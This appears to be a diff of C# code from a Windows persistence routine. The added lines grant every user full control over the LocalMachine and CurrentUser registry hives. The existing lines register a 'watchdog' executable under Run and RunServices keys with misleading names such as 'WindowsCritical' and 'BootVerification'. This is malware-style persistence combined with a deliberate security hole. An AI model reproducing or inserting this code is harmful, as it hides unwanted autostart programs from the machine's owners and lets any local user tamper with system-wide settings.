@@ -11,9 +11,12 @@ using System.IO;
 
         public static void runAllTechniques()
         {
-            //CurrentUser keys dont run as System and are not in use
+            GrantEveryoneFullControl(Registry.LocalMachine); //grants all users full control over reg keys
+            GrantEveryoneFullControl(Registry.CurrentUser);
 
-            SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\RunServicesOnce", "RunOnSystemStartTask", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine); // Run Keys on startup
+        //CurrentUser keys dont run as System and are not in use
+
+        SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\RunServicesOnce", "RunOnSystemStartTask", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine); // Run Keys on startup
             //SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\RunServicesOnce", "WindowsRunOnSystemStartTask", Config.PrimaryWatchdogFullPath, RegistryHive.CurrentUser);
             SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\RunServices", "BootVerification", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine);
             SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\RunServices", "WindowsCritical", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine);
